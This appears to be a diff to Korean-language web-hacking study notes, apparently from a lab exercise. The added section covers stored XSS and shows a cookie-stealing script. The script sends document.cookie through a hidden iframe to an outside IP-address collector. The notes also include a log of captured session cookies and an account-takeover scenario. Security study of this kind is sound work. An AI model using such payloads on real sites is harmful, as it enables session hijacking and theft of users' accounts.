@@ -30,5 +30,61 @@
 - 검색창 & 모든 파라미터를 대상으로 공격 가능
 - 테이블의 구문을 파악 후 취약점 스캔
 
+---
+
+## Stored XSS
+
+취약점이 있는 웹 서버에 악성 스크립트를 영구적으로 저장.
+
+
+---
+
+## 쿠키 탈취 공격
+
+```txt
+http://121.190.160.232:81/XSSAttack/attack_cookie.txt
+
+"><script>alert(document.cookie)</script>
+// ASPSESSIONIDCSTBCQTA=KACOEGOCFMJGLNBDJLCEKEEP
+
+```
+![](../Images/Pasted%20image%2020260731105122.png)
+
+```txt
+<script> document.write("<iframe scr=http://121.190.160.232:81/XSSAttack/1.asp?cookie" + document.cookie+" width =0 height =0 > </iframe>")</script>
+```
+
+```txt
+
+-- 탈취된 쿠키값.
+ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=HOONEGOCIKLNFDCEKHCCDNFH
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=HOONEGOCIKLNFDCEKHCCDNFH
+---------------------------------------
+ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
+```
+
+**시나리오**
+1. 사용자 게시판 접속
+2. 쿠키 탈취되어 개별 txt에 쿠키 저장
+3. 웹 서버에 다른 사용자 쿠키 값으로 변경 시 계정 탈취 가능
+
+기존 로그인 정보값
+- mmmm > asdqwe(hacker) 값으로 변경
+![](../Images/Pasted%20image%2020260731112409.png)
 
 
